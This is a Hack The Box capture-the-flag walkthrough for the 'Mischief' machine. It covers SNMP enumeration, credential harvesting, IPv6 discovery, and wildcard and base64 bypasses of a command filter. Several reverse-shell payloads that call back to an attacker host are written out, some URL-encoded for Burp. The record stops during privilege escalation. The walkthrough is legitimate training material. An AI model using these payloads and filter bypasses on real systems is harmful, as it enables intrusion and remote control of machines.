@@ -1,0 +1,1110 @@
+Mischief - Hack The Box - Linux Insane - SNMP, ICMP
+
+After running nmap we only find ssh open and no vulnerabilities regarding current ssh version.
+
+Next thing to do is run a full port scan on the box and a udp scan and see if we can find more open ports and services.
+Commands and Output:
+==================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/mischief/nmap]
+└──╼ $sudo nmap -sU -oA mischief-udp 10.10.10.92
+..
+..
+..
+
+==================================================================================================================================
+
+We eventually come to find that udp port 161 is open and we can use numerous tools to do snmp recon. One tool "onesisxtyone" version
+0.3.3 allows us to do recon on snmp version 1 and 2.
+
+Commands and Output:
+==================================================================================================================================
+┌─[✗]─[user@parrot-virtual]─[~/htb/mischief/nmap]
+└──╼ $find /opt/SecLists/ | grep -i snmp
+/opt/SecLists/Discovery/SNMP
+/opt/SecLists/Discovery/SNMP/common-snmp-community-strings-onesixtyone.txt
+/opt/SecLists/Discovery/SNMP/common-snmp-community-strings.txt
+/opt/SecLists/Discovery/SNMP/snmp-onesixtyone.txt
+/opt/SecLists/Discovery/SNMP/snmp.txt
+==================================================================================================================================
+
+We can use one of these text files to bruteforce community strings for example:
+Commands and Output:
+==================================================================================================================================
+┌─[✗]─[user@parrot-virtual]─[~/htb/mischief/nmap]
+└──╼ $onesixtyone 10.10.10.92 -c /opt/SecLists/Discovery/SNMP/common-snmp-community-strings.txt
+Scanning 1 hosts, 121 communities
+10.10.10.92 [public] Linux Mischief 4.15.0-20-generic #21-Ubuntu SMP Tue Apr 24 06:16:15 UTC 2018 x86_64
+10.10.10.92 [public] Linux Mischief 4.15.0-20-generic #21-Ubuntu SMP Tue Apr 24 06:16:15 UTC 2018 x86_6
+==================================================================================================================================
+
+We get results back from the "public" community string, next we want to use snmpwalk to alongside the newly found community string
+and see if we get any results back, but first we need to install snmp and it's mib database.
+
+Commands and Output:
+==================================================================================================================================
+┌─[✗]─[user@parrot-virtual]─[~/htb/mischief/nmap]
+└──╼ $sudo apt install snmp
+┌─[✗]─[user@parrot-virtual]─[~/htb/mischief/nmap]
+└──╼ $sudo apt install snmp-mibs-downloader
+==================================================================================================================================
+
+We run snmpwalk and looks like ti works.
+Commands and Output:
+==================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/mischief/nmap]
+└──╼ $snmpwalk -c public -v2c 10.10.10.92
+iso.3.6.1.2.1.1.1.0 = STRING: "Linux Mischief 4.15.0-20-generic #21-Ubuntu SMP Tue Apr 24 06:16:15 UTC 2018 x86_64"
+iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.8072.3.2.10
+iso.3.6.1.2.1.1.3.0 = Timeticks: (1011650) 2:48:36.50
+iso.3.6.1.2.1.1.4.0 = STRING: "Me <me@example.org>"
+iso.3.6.1.2.1.1.5.0 = STRING: "Mischief"
+iso.3.6.1.2.1.1.6.0 = STRING: "Sitting on the Dock of the Bay"
+iso.3.6.1.2.1.1.7.0 = INTEGER: 72
+iso.3.6.1.2.1.1.8.0 = Timeticks: (1) 0:00:00.01
+iso.3.6.1.2.1.1.9.1.2.1 = OID: iso.3.6.1.6.3.11.3.1.1
+iso.3.6.1.2.1.1.9.1.2.2 = OID: iso.3.6.1.6.3.15.2.1.1
+iso.3.6.1.2.1.1.9.1.2.3 = OID: iso.3.6.1.6.3.10.3.1.1
+iso.3.6.1.2.1.1.9.1.2.4 = OID: iso.3.6.1.6.3.1
+iso.3.6.1.2.1.1.9.1.2.5 = OID: iso.3.6.1.6.3.16.2.2.1
+iso.3.6.1.2.1.1.9.1.2.6 = OID: iso.3.6.1.2.1.49
+iso.3.6.1.2.1.1.9.1.2.7 = OID: iso.3.6.1.2.1.4
+iso.3.6.1.2.1.1.9.1.2.8 = OID: iso.3.6.1.2.1.50
+iso.3.6.1.2.1.1.9.1.2.9 = OID: iso.3.6.1.6.3.13.3.1.3
+iso.3.6.1.2.1.1.9.1.2.10 = OID: iso.3.6.1.2.1.92
+iso.3.6.1.2.1.1.9.1.3.1 = STRING: "The MIB for Message Processing and Dispatching."
+iso.3.6.1.2.1.1.9.1.3.2 = STRING: "The management information definitions for the SNMP User-based Security Model."
+iso.3.6.1.2.1.1.9.1.3.3 = STRING: "The SNMP Management Architecture MIB."
+iso.3.6.1.2.1.1.9.1.3.4 = STRING: "The MIB module for SNMPv2 entities"
+iso.3.6.1.2.1.1.9.1.3.5 = STRING: "View-based Access Control Model for SNMP."
+iso.3.6.1.2.1.1.9.1.3.6 = STRING: "The MIB module for managing TCP implementations"
+iso.3.6.1.2.1.1.9.1.3.7 = STRING: "The MIB module for managing IP and ICMP implementations"
+iso.3.6.1.2.1.1.9.1.3.8 = STRING: "The MIB module for managing UDP implementations"
+iso.3.6.1.2.1.1.9.1.3.9 = STRING: "The MIB modules for managing SNMP Notification, plus filtering."
+iso.3.6.1.2.1.1.9.1.3.10 = STRING: "The MIB module for logging SNMP Notifications."
+..
+..
+..
+
+==================================================================================================================================
+
+
+We also check our all-ports that has finished and we get the following
+Commands and Output:
+==================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/mischief/nmap]
+└──╼ $cat all-ports 
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-17 13:17 PDT
+Nmap scan report for 10.10.10.92
+Host is up (0.087s latency).
+Not shown: 65533 filtered ports
+PORT     STATE SERVICE
+22/tcp   open  ssh
+3366/tcp open  creativepartnr
+
+Nmap done: 1 IP address (1 host up) scanned in 161.56 seconds
+==================================================================================================================================
+
+We get the following running a version scan
+Commands and Output:
+==================================================================================================================================
+└──╼ $sudo nmap -p 3366 -sV 10.10.10.92
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-17 16:07 PDT
+Nmap scan report for 10.10.10.92
+Host is up (0.090s latency).
+
+PORT     STATE SERVICE VERSION
+3366/tcp open  caldav  Radicale calendar and contacts server (Python BaseHTTPServer)
+==================================================================================================================================
+
+We will look over this later and focus on snmp for the meantime.
+We already installed some snmp mibs, we just need comment a line inside "/etc/snmp/snmp.conf"
+Commands and Output:
+==================================================================================================================================
+# As the snmp packages come without MIB files due to license reasons, loading$    
+# of MIBs is disabled by default. If you added the MIBs you can reenable$    
+# loading them by commenting out the following line.$    
+mibs :$
+==================================================================================================================================
+
+Now we run snmpwalk again using the same command in order to get the ipv6 address for the box.
+Commands and Output:
+==================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/mischief/nmap]
+└──╼ $snmpwalk -c public -v2c 10.10.10.92
+SNMPv2-MIB::sysDescr.0 = STRING: Linux Mischief 4.15.0-20-generic #21-Ubuntu SMP Tue Apr 24 06:16:15 UTC 2018 x86_64
+SNMPv2-MIB::sysObjectID.0 = OID: NET-SNMP-MIB::netSnmpAgentOIDs.10
+DISMAN-EVENT-MIB::sysUpTimeInstance = Timeticks: (1079714) 2:59:57.14
+SNMPv2-MIB::sysContact.0 = STRING: Me <me@example.org>
+SNMPv2-MIB::sysName.0 = STRING: Mischief
+SNMPv2-MIB::sysLocation.0 = STRING: Sitting on the Dock of the Bay
+SNMPv2-MIB::sysServices.0 = INTEGER: 72
+SNMPv2-MIB::sysORLastChange.0 = Timeticks: (1) 0:00:00.01
+SNMPv2-MIB::sysORID.1 = OID: SNMP-MPD-MIB::snmpMPDCompliance
+SNMPv2-MIB::sysORID.2 = OID: SNMP-USER-BASED-SM-MIB::usmMIBCompliance
+SNMPv2-MIB::sysORID.3 = OID: SNMP-FRAMEWORK-MIB::snmpFrameworkMIBCompliance
+..
+..
+..
+
+==================================================================================================================================
+
+We no longer get those weird oid numbers we got originally and instead see the mibs translation.
+Another way to to get the ipv6 address is to do a link local address ping which we can then get the mac address of the box,
+the mac address is translated to the link local address in many linux distros.
+
+While we let snmpwalk continue we go to the python http server and come across an auth required page on the port 3366,
+this is simple http server, inorder to pass simplehttpserver a password it has to be done in the commandline through an argument.
+
+One of the things snmp does is record all running processes. So we can grep simplehttpserver on the snmpwalk output.
+Commands and Output:
+==================================================================================================================================
+┌─[✗]─[user@parrot-virtual]─[~/htb/mischief]
+└──╼ $grep -i simplehttp snmpwalk-mib.out 
+HOST-RESOURCES-MIB::hrSWRunParameters.571 = STRING: "-m SimpleHTTPAuthServer 3366 loki:godofmischiefisloki --dir /home/loki/hosted/"
+==================================================================================================================================
+
+We get the creds which we can now use to login to the http server.
+loki godofmischiefisloki
+
+Once we login we get more creds, which make a note of.
+Commands and Output:
+==================================================================================================================================
+Credentials:
+Username 	Password
+loki 	godofmischiefisloki
+loki 	trickeryanddeceit
+==================================================================================================================================
+
+We can try and use the password for ssh but to no success.
+We go back to our snmp out put and search for other running programs.
+Commands and Output:
+==================================================================================================================================
+HOST-RESOURCES-MIB::hrSWRunParameters.549 = STRING: "-f"
+HOST-RESOURCES-MIB::hrSWRunParameters.551 = STRING: "/var/lib/lxcfs/"
+HOST-RESOURCES-MIB::hrSWRunParameters.554 = STRING: "-f"
+HOST-RESOURCES-MIB::hrSWRunParameters.561 = ""
+HOST-RESOURCES-MIB::hrSWRunParameters.562 = STRING: "-f"
+HOST-RESOURCES-MIB::hrSWRunParameters.567 = STRING: "-c /home/loki/hosted/webstart.sh"
+HOST-RESOURCES-MIB::hrSWRunParameters.568 = STRING: "--system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only"
+HOST-RESOURCES-MIB::hrSWRunParameters.569 = STRING: "/home/loki/hosted/webstart.sh"
+HOST-RESOURCES-MIB::hrSWRunParameters.570 = ""
+HOST-RESOURCES-MIB::hrSWRunParameters.571 = STRING: "-m SimpleHTTPAuthServer 3366 loki:godofmischiefisloki --dir /home/loki/hosted/"
+HOST-RESOURCES-MIB::hrSWRunParameters.574 = STRING: "/usr/bin/networkd-dispatcher"
+HOST-RESOURCES-MIB::hrSWRunParameters.575 = ""
+HOST-RESOURCES-MIB::hrSWRunParameters.576 = STRING: "-n"
+HOST-RESOURCES-MIB::hrSWRunParameters.577 = STRING: "-Lsd -Lf /dev/null -u Debian-snmp -g Debian-snmp -I -smux mteTrigger mteTriggerConf -f"
+HOST-RESOURCES-MIB::hrSWRunParameters.603 = STRING: "--no-debug"
+HOST-RESOURCES-MIB::hrSWRunParameters.647 = STRING: "--daemonize --pid-file=/run/mysqld/mysqld.pid"
+HOST-RESOURCES-MIB::hrSWRunParameters.665 = STRING: "-D"
+HOST-RESOURCES-MIB::hrSWRunParameters.675 = ""
+..
+..
+..
+==================================================================================================================================
+
+We see the output of ps, potential privesc is that loki is a member of lxc group. We look for ips and come across a bunch of 
+ipv6 addresses
+Commands and Output:
+==================================================================================================================================
+..
+..
+..
+IP-FORWARD-MIB::inetCidrRouteIfIndex.ipv6."00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00".0.3.0.0.5.ipv6."fe:80:00:00:00:00:00:00:02:50:56:ff:fe:b9:3f:81" = INTEGER: 2
+IP-FORWARD-MIB::inetCidrRouteIfIndex.ipv6."00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:01".128.3.0.0.6.ipv6."00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00" = INTEGER: 1
+IP-FORWARD-MIB::inetCidrRouteIfIndex.ipv6."de:ad:be:ef:00:00:00:00:00:00:00:00:00:00:00:00".64.3.0.0.3.ipv6."00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00" = INTEGER: 2
+IP-FORWARD-MIB::inetCidrRouteIfIndex.ipv6."de:ad:be:ef:00:00:00:00:02:50:56:ff:fe:b9:2c:a9".128.3.0.0.7.ipv6."00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00" = INTEGER: 2
+IP-FORWARD-MIB::inetCidrRouteIfIndex.ipv6."fe:80:00:00:00:00:00:00:00:00:00:00:00:00:00:00".64.3.0.0.4.ipv6."00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00" = INTEGER: 2
+IP-FORWARD-MIB::inetCidrRouteIfIndex.ipv6."fe:80:00:00:00:00:00:00:02:50:56:ff:fe:b9:2c:a9".128.3.0.0.8.ipv6."00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00" = INTEGER: 2
+IP-FORWARD-MIB::inetCidrRouteIfIndex.ipv6."ff:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00".8.3.0.0.9.ipv6."00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00" = INTEGER: 2
+..
+..
+..
+==================================================================================================================================
+
+The ipv6 address wil be "de:ad:be:ef:00:00:00:00:02:50:56:ff:fe:b9:2c:a9"
+
+We need to convert the hex string into an ipv6 address which is broken up into 4 characters at a time.
+"dead:beef:0000:0000:0250:56ff:feb9:2ca9"
+Commands and Output:
+==================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/mischief]
+└──╼ $ping6 dead:beef:0000:0000:0250:56ff:feb9:2ca9
+PING dead:beef:0000:0000:0250:56ff:feb9:2ca9(dead:beef::250:56ff:feb9:2ca9) 56 data bytes
+64 bytes from dead:beef::250:56ff:feb9:2ca9: icmp_seq=1 ttl=63 time=85.7 ms
+64 bytes from dead:beef::250:56ff:feb9:2ca9: icmp_seq=2 ttl=63 time=88.1 ms
+64 bytes from dead:beef::250:56ff:feb9:2ca9: icmp_seq=3 ttl=63 time=94.0 ms
+..
+..
+..
+==================================================================================================================================
+
+Success, now we can run nmap scans using the ipv6 address.
+Commands and Output:
+==================================================================================================================================
+└──╼ $sudo nmap -sV -sC -oA mischief-ipv6 -6 dead:beef::250:56ff:feb9:2ca9
+[sudo] password for user: 
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-17 16:48 PDT
+Nmap scan report for dead:beef::250:56ff:feb9:2ca9
+Host is up (0.13s latency).
+Not shown: 998 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 2a:90:a6:b1:e6:33:85:07:15:b2:ee:a7:b9:46:77:52 (RSA)
+|   256 d0:d7:00:7c:3b:b0:a6:32:b2:29:17:8d:69:a6:84:3f (ECDSA)
+|_  256 3f:1c:77:93:5c:c0:6c:ea:26:f4:bb:6c:59:e9:7c:b0 (ED25519)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: 400 Bad Request
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Host script results:
+| address-info: 
+|   IPv6 EUI-64: 
+|     MAC address: 
+|       address: 00:50:56:b9:2c:a9
+|_      manuf: VMware
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 12.73 seconds
+
+==================================================================================================================================
+
+Port 80 is now on using ipv6. We must specify the ipv6 address with brackets since ":" are used as separators.
+http://[dead:beef::250:56ff:feb9:2ca9]/
+
+Once we get a login panel to execute commands we try to use the creds we previously gathered.
+However they do not much.
+We try other users admin, administrator and we get in with administrator:trickeryanddeceit
+
+We get the following output once logged in
+Commands and Output:
+==================================================================================================================================
+ Command Execution Panel
+
+Welcome administrator
+
+Logout?
+Command:
+
+In my home directory, i have my password in a file called credentials, Mr Admin
+
+Command was executed succesfully!
+==================================================================================================================================
+
+will be usefull later on we can try and execute commands now on the box and see if we can get a reverse shell.
+We attempt to ping ourselves and it works.
+Commands and Output:
+==================================================================================================================================
+ping -c 2 10.10.14.18
+..
+..
+..
+└──╼ $sudo tcpdump -i tun0 -n icmp
+tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
+listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
+16:56:09.412985 IP 10.10.10.92 > 10.10.14.18: ICMP echo request, id 1657, seq 1, length 64
+16:56:09.413022 IP 10.10.14.18 > 10.10.10.92: ICMP echo reply, id 1657, seq 1, length 64
+16:56:10.451404 IP 10.10.10.92 > 10.10.14.18: ICMP echo request, id 1657, seq 2, length 64
+16:56:10.451452 IP 10.10.14.18 > 10.10.10.92: ICMP echo reply, id 1657, seq 2, length 64
+
+==================================================================================================================================
+
+We try the following below for a reverse shell but get the following response.
+bash -c 'bash -i >& /dev/tcp/10.10.14.18/9001 0>&1'
+
+Commands and Output:
+==================================================================================================================================
+ Command Execution Panel
+
+Welcome administrator
+
+Logout?
+Command:
+
+In my home directory, i have my password in a file called credentials, Mr Admin
+
+Command is not allowed.
+==================================================================================================================================
+
+"Command is not allowed", tried echo 'echo hello' | bash 
+but it looks like pipes are not allowed, lets try command subsitution.
+
+Seems like there is a blacklist of commands not to use.
+wget, curl, nc others not allowed
+
+We notice we can chain commands together for example:
+cat /etc/passwd; sleep 1 returns output while previous commands did not.
+
+echo -n "YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xOC85MDAxIDA+JjEn" > /tmp/hitme
+
+sleep 1; base64 -d /tmp/hitme
+Commands and Output:
+==================================================================================================================================
+In my home directory, i have my password in a file called credentials, Mr Admin
+
+root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin 
+sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin 
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin 
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin 
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin 
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin 
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin 
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin 
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin 
+systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin 
+systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin 
+syslog:x:102:106::/home/syslog:/usr/sbin/nologin messagebus:x:103:107::/nonexistent:/usr/sbin/nologin 
+_apt:x:104:65534::/nonexistent:/usr/sbin/nologin lxd:x:105:65534::/var/lib/lxd/:/bin/false 
+uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin 
+landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin pollinate:x:109:1::/var/cache/pollinate:/bin/false 
+sshd:x:110:65534::/run/sshd:/usr/sbin/nologin 
+loki:x:1000:1004:loki:/home/loki:/bin/bash Debian-snmp:x:111:113::/var/lib/snmp:/bin/false 
+mysql:x:112:115:MySQL Server,,,:/nonexistent:/bin/false Command was executed succesfully!
+==================================================================================================================================
+
+cat /etc/iptables.conf; sleep 1
+echo hello > /dev/shm/test ; cat /dev/shm/test; sleep 1
+
+We might be able to base64 encode the reverse shell and get code execution.
+echo -n "YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xOC85MDAxIDA+JjEn" >/dev/shm/testing; cat /dev/shm/testing; sleep 1
+
+There seems to be a block on running bash so we can bypass this by creating and writing to files on the local filesystem.
+We try the following base64 encoded payload however we end up hanging the webserver so it turns out to be a futile process.
+
+Commands and Output:
+==================================================================================================================================
+echo -n YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xOC85MDAxIDA+JjEn >/dev/shm/testing; base64 -d -w0 /dev/shm/testing > /dev/shm/shell; sh /dev/shm/shell; sleep 1
+==================================================================================================================================
+
+If you reset the machine the ipv6 address will change, FYI.
+Commands and Output:
+==================================================================================================================================
+0<&196;exec 196<>/dev/tcp/10.10.14.18/9001; sh <&196 >&196 2>&196
+==================================================================================================================================
+
+How to view file contents without "ls"
+Commands and Output:
+==================================================================================================================================
+printf '%s\n' /home/loki/* ; echo
+..
+..
+..
+
+In my home directory, i have my password in a file called credentials, Mr Admin
+
+/home/loki/credentials /home/loki/hosted /home/loki/user.txt Command was executed succesfully!
+==================================================================================================================================
+
+The WAF is blocking us from viewing the credentials file. TO bypass simply enter "cred*" in a cat command, example:
+Commands and Output:
+==================================================================================================================================
+cat /home/loki/cred* ; echo
+
+..
+..
+..
+In my home directory, i have my password in a file called credentials, Mr Admin
+
+pass: lokiisthebestnorsegod Command was executed succesfully!
+==================================================================================================================================
+
+So the pass is lokiisthebestnorsegod. We can try and ssh as the loki user with the password.
+AND we are in 
+Commands and Output:
+==================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/mischief]
+└──╼ $ssh -l loki 10.10.10.92
+The authenticity of host '10.10.10.92 (10.10.10.92)' can't be established.
+ECDSA key fingerprint is SHA256:deaxXTK7ORthfGcKdblPRUmgNrU20oclqMbwVj3hzYI.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.10.92' (ECDSA) to the list of known hosts.
+loki@10.10.10.92's password: 
+Welcome to Ubuntu 18.04 LTS (GNU/Linux 4.15.0-20-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Tue May 18 01:41:42 UTC 2021
+
+  System load:  0.0                Processes:            100
+  Usage of /:   26.7% of 15.68GB   Users logged in:      0
+  Memory usage: 34%                IP address for ens33: 10.10.10.92
+  Swap usage:   0%
+
+
+ * Canonical Livepatch is available for installation.
+   - Reduce system reboots and improve kernel security. Activate at:
+     https://ubuntu.com/livepatch
+
+0 packages can be updated.
+0 updates are security updates.
+
+
+Last login: Sat Jul 14 12:44:04 2018 from 10.10.14.4
+loki@Mischief:~$ whoami
+loki
+==================================================================================================================================
+
+New ipv6 address
+Commands and Output:
+==================================================================================================================================
+┌─[✗]─[user@parrot-virtual]─[~/htb/mischief]
+└──╼ $ping6 dead:beef:0000:0000:0250:56ff:feb9:6538
+PING dead:beef:0000:0000:0250:56ff:feb9:6538(dead:beef::250:56ff:feb9:6538) 56 data bytes
+64 bytes from dead:beef::250:56ff:feb9:6538: icmp_seq=1 ttl=63 time=86.0 ms
+64 bytes from dead:beef::250:56ff:feb9:6538: icmp_seq=2 ttl=63 time=85.1 ms
+^C
+--- dead:beef:0000:0000:0250:56ff:feb9:6538 ping statistics ---
+2 packets transmitted, 2 received, 0% packet loss, time 1000ms
+rtt min/avg/max/mdev = 85.096/85.557/86.019/0.461 ms
+==================================================================================================================================
+
+There were numerous way to bypass the WAF another way instead of using "*" was using "?" to finish a command or replace a character.
+Example:
+Commands and Output:
+==================================================================================================================================
+/usr/bin/fin? /home/loki; echo
+
+..
+..
+..
+
+/home/loki
+/home/loki/.profile
+/home/loki/.selected_editor
+/home/loki/.bash_logout
+/home/loki/.sudo_as_admin_successful
+/home/loki/.bashrc
+/home/loki/.mysql_history
+/home/loki/user.txt
+/home/loki/.cache
+/home/loki/.gnupg
+/home/loki/.wget-hsts
+/home/loki/credentials
+/home/loki/.bash_history
+/home/loki/.local
+/home/loki/.local/lib
+/home/loki/.local/share
+/home/loki/hosted
+/home/loki/hosted/loki.jpg
+/home/loki/hosted/index.html
+/home/loki/hosted/webstart.sh
+Command was executed succesfully!
+==================================================================================================================================
+
+We could have tried the following but due to certain firewall rules, this would have been blocked. And the webserver would have 
+most likely hanged. 
+Commands and Output:
+==================================================================================================================================
+/bin/bas? -c '/bin/bas? >& /dev/tcp/10.10.14.18/9001 0&>1'; echo
+==================================================================================================================================
+
+The reason why we got output after running "; <command>" is cause the last command is being redirected to /dev/null
+Look at index.php in /var/www/html for detail
+Commands and Output:
+==================================================================================================================================
+} else {
+		system("$cmd > /dev/null 2>&1");
+		echo "Command was executed succesfully!";
+	}
+
+==================================================================================================================================
+
+Now once in we can examine the contents of lokis directory
+Commands and Output:
+==================================================================================================================================
+loki@Mischief:~$ ls -la
+total 60
+drwxr-xr-x 6 loki loki 4096 Jul 14  2018 .
+drwxr-xr-x 3 root root 4096 May 14  2018 ..
+-rw------- 1 loki loki  192 Jul 14  2018 .bash_history
+-rw-r--r-- 1 loki loki  220 Apr  4  2018 .bash_logout
+-rw-r--r-- 1 loki loki 3771 Apr  4  2018 .bashrc
+drwx------ 2 loki loki 4096 May 14  2018 .cache
+drwx------ 3 loki loki 4096 May 14  2018 .gnupg
+drwxrwxr-x 4 loki loki 4096 May 14  2018 .local
+-rw------- 1 loki loki  125 May 14  2018 .mysql_history
+-rw-r--r-- 1 loki loki  807 Apr  4  2018 .profile
+-rw-rw-r-- 1 loki loki   66 May 14  2018 .selected_editor
+-rw-r--r-- 1 loki loki    0 May 14  2018 .sudo_as_admin_successful
+-rw-rw-r-- 1 loki loki  176 May 14  2018 .wget-hsts
+-rw-rw-r-- 1 loki loki   28 May 17  2018 credentials
+drwxrwxr-x 2 loki loki 4096 May 15  2018 hosted
+-r-------- 1 loki loki   33 May 17  2018 user.txt
+==================================================================================================================================
+
+We examine the bash history for the user and come to find a new password
+Commands and Output:
+==================================================================================================================================
+loki@Mischief:~$ cat .bash_history 
+python -m SimpleHTTPAuthServer loki:lokipasswordmischieftrickery
+exit
+free -mt
+ifconfig
+cd /etc/
+sudo su
+su
+exit
+su root
+ls -la
+sudo -l
+ifconfig
+id
+cat .bash_history 
+nano .bash_history 
+exit
+whoami
+ls
+cd /var/www/html/
+ls
+
+..
+..
+..
+
+==================================================================================================================================
+
+We find the new password and try to su to root however we are blocked. Which is interesting.
+Commands and Output:
+==================================================================================================================================
+loki@Mischief:~$ su -
+-bash: /bin/su: Permission denied
+==================================================================================================================================
+
+We examine the binary and notice everyone has read and execute permissions. We also take a look with getfacl and notice something.
+Commands and Output:
+==================================================================================================================================
+loki@Mischief:~$ ls -la /bin/su
+-rwsr-xr-x+ 1 root root 44664 Jan 25  2018 /bin/su
+
+..
+..
+..
+
+loki@Mischief:~$ getfacl /bin/su
+getfacl: Removing leading '/' from absolute path names
+# file: bin/su
+# owner: root
+# group: root
+# flags: s--
+user::rwx
+user:loki:r--
+group::r-x
+mask::r-x
+other::r-x
+==================================================================================================================================
+
+Loki only has read permissions on the file and no execute perms. Given that we are blocked from using that command we will have to 
+become another user to su to root. The webserver user will most likely serve this purpose.
+Commands and Output:
+==================================================================================================================================
+whoami; echo
+
+</body>
+</html>
+www-data
+Command was executed succesfully!
+==================================================================================================================================
+
+So we have to find a way to get a shell thorugh bypassing the WAF and IPTABLE rules setup to block tcp connections.
+Let's use burp for this stage. We will try a reverse shell, however using netcat with ipv6 addressing to bypass any firewalls 
+setup for ipv4.
+
+Go to pentest monkey reverse shell using the following payload
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
+Commands and Output:
+==================================================================================================================================
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc -6 dead:beef:2::1010 9001 >/tmp/f
+
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|/bin/n? -6 dead:beef:2::1010 9001 >/tmp/f
+
+FINAL PAYLOAD BURP:
+command=rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2>%261|/bin/n%3f+-6+dead%3abeef%3a2%3a%3a1010+9001+>/tmp/f
+==================================================================================================================================
+
+We get a connection however we can't issue commands.
+Commands and Output:
+==================================================================================================================================
+└──╼ $nc -6 -lnvp 9001
+Ncat: Version 7.91 ( https://nmap.org/ncat )
+Ncat: Listening on :::9001
+Ncat: Connection from dead:beef::250:56ff:feb9:6538.
+Ncat: Connection from dead:beef::250:56ff:feb9:6538:47074.
+/bin/sh: 0: can't access tty; job control turned off
+$ 
+ls
+id
+pwd
+ls
+^C
+
+==================================================================================================================================
+
+So what will do is base64 command and then run it with bash.
+NOTE: This only works since the only 2 letter binary installed stating with is netcat and "?" resolves to it first.
+Commands and Output:
+==================================================================================================================================
+echo -n "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|/bin/n? -6 dead:beef:2::1010 9001 >/tmp/f" | base64 -w0
+cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI+JjF8L2Jpbi9uPyAtNiBkZWFkOmJlZWY6Mjo6MTAxMCA5MDAxID4vdG1wL2Y=
+
+echo -n cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI+JjF8L2Jpbi9uPyAtNiBkZWFkOmJlZWY6Mjo6MTAxMCA5MDAxID4vdG1wL2Y=| base64 -d | sh
+
+URL ENCODED BURP:
+command=echo+-n+cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI%2bJjF8L2Jpbi9uPyAtNiBkZWFkOmJlZWY6Mjo6MTAxMCA5MDAxID4vdG1wL2Y%3d|+base64+-d+|+sh
+
+==================================================================================================================================
+
+And we get a working shell.
+Commands and Output:
+==================================================================================================================================
+-virtual]─[~/htb/mischief]
+└──╼ $nc -6 -lnvp 9001
+Ncat: Version 7.91 ( https://nmap.org/ncat )
+Ncat: Listening on :::9001
+Ncat: Connection from dead:beef::250:56ff:feb9:6538.
+Ncat: Connection from dead:beef::250:56ff:feb9:6538:47076.
+/bin/sh: 0: can't access tty; job control turned off
+$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+$ su -
